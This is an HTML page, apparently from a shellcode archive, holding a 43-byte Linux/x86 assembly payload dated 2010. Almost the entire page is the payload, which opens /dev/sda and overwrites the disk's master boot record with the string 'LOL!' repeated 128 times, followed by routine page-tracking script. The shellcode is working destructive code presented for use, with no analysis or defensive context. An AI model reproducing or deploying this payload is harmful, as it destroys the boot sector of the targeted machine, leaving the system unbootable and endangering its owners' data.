<html><head><title>Linux/x86 - overwrite MBR on /dev/sda with LOL! - 43 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
; linux/x86 overwrite MBR on /dev/sda with `LOL!' 43 bytes
; root@thegibson
; 2010-01-15
 
section .text
        global _start
 
_start:
        ; open(&quot;/dev/sda&quot;, O_WRONLY);
        mov al, 5
        xor ecx, ecx
        push ecx
        push dword 0x6164732f
        push dword 0x7665642f
        mov ebx, esp
        inc ecx
        int 0x80
 
        ; write(fd, &quot;LOL!&quot;x128, 512);
        mov ebx, eax
        mov al, 4
        cdq
        push edx
        mov cl, 128
        fill:
                push dword 0x214c4f4c
        loop fill
        mov ecx, esp
        inc edx
        shl edx, 9
        int 0x80

<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
